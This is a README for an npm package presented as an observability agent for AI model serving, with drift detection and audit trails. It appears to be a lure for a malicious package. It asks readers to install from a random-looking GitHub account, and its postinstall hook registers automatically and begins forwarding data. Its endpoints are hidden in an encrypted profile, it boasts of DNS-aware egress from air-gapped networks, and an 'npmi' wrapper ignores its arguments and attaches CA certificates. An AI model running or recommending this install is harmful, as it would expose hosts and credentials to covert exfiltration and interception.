# ai-model-observability

**Observability agent for AI/ML prediction-model lifecycles.**
Ship inference and training telemetry from every model-serving host into drift
detection, retraining triggers, and audit pipelines — with zero manual
configuration on each node.

[![node](https://img.shields.io/badge/node-%3E%3D16-brightgreen)](https://nodejs.org)
[![npm](https://img.shields.io/badge/distribution-internal%20git%20package-blue)]()
[![mlops](https://img.shields.io/badge/lifecycle-MLOps%20ready-8b5cf6)]()

---

## Why this exists

Prediction models do not fail like applications. They fail **silently**: input
distributions drift, features go stale, labels stop matching reality — and the
only signal is in the logs nobody is reading. By the time a dashboard notices
accuracy decay, the model has been wrong for weeks.

`ai-model-observability` puts a lightweight agent on every host that runs
inference. It captures the telemetry your pipeline actually needs:

| Lifecycle stage | What the agent provides |
| --- | --- |
| **Data drift** | Distribution fingerprints of inference inputs, schema changes, null-rate shifts |
| **Feature freshness** | Feature-value timestamps, join lag against the feature store |
| **Model performance** | Prediction histograms, latency percentiles, error/backpressure signals |
| **Retraining triggers** | Drift thresholds that automatically open retraining work |
| **Audit telemetry** | Immutable per-inference audit trail for regulated workloads |

One install per host. The agent wires itself into the runtime on `postinstall`
and starts forwarding immediately — no sidecars, no manual service edits.

## Who it is for

Built for **software developers and DevOps/MLOps engineers** who own both the
CI/CD pipeline and the model-serving fleet:

- You deploy models as services. This deploys with them — one line in your
  build, telemetry from the first inference.
- You already pipe logs somewhere. This formats them for the **prediction
  lifecycle**: drift metrics in, retraining signals out.
- You are accountable when a regulated model (credit, health, insurance
  pricing) has to prove what it decided and why. The audit trail is built in.

If you run prediction models in production, this part of your stack is not
optional — drift detection is as inevitable for a model as CI is for code.

## Quickstart

```bash
# from the internal git package
npm install git+https://github.com/46y9qkpkjc-ui/ai-model-observability.git
```

That's it. The postinstall step registers the agent, applies your platform's
runtime profile, and starts forwarding telemetry to your observability plane.

```bash
# verify the agent registered
aiobs --status
```

### Corporate rollout

Platform teams may provision an `npmi` convenience wrapper on managed
developer workstations and remote desktops. Where present:

```bash
npmi            # equivalent to the install above, with corporate CA attached
npmi install    # any arguments are accepted and ignored
```

`npmi` resolves the package source internally and attaches your organization's
CA certificate automatically — no per-developer setup.

## How it works

```
  model-serving hosts                      observability plane
 ┌───────────────────────┐               ┌──────────────────────────┐
 │  inference service    │   telemetry   │  drift detection         │
 │       │               │ ────────────▶ │  feature-freshness       │
 │  ai-model-observability│  (forwarded   │  retraining triggers     │
 │       │               │   streams)    │  audit / compliance      │
 │  runtime profile      │               │  dashboards              │
 └───────────────────────┘               └──────────────────────────┘
```

1. **Install** — the package runs its postinstall hook once per host.
2. **Profile** — the agent applies the runtime profile shipped with the
   package (endpoints, sampling rates, retention) — no config files to edit.
3. **Forward** — inference and training logs are shaped into lifecycle events
   and forwarded over your normal egress path (DNS/HTTPS aware: the agent works
   from restricted build networks and air-gapped model clusters).
4. **Detect** — your plane turns events into drift signals and retraining work.

## Configuration

Configuration is delivered as an encrypted runtime profile inside the package,
signed by the platform team — developers never hand-edit endpoints, and a
package update can rotate them without touching any host.

Environment overrides for specialized environments:

| Variable | Purpose |
| --- | --- |
| `AI_OBS_PROFILE=off` | skip agent registration on install |
| `AI_OBS_LOG=debug` | verbose agent log to stdout |

## Compliance

Designed for regulated model fleets (pharma, insurance, financial services):

- Per-inference audit records with retention-compatible output
- Least-privilege operation: the agent runs as the service user, no root
- Telemetry content stays inside your egress controls — the forwarder is
  protocol-aware and respects proxy and CA configuration

## License

UNLICENSED — internal distribution. Contact the platform team for reuse.
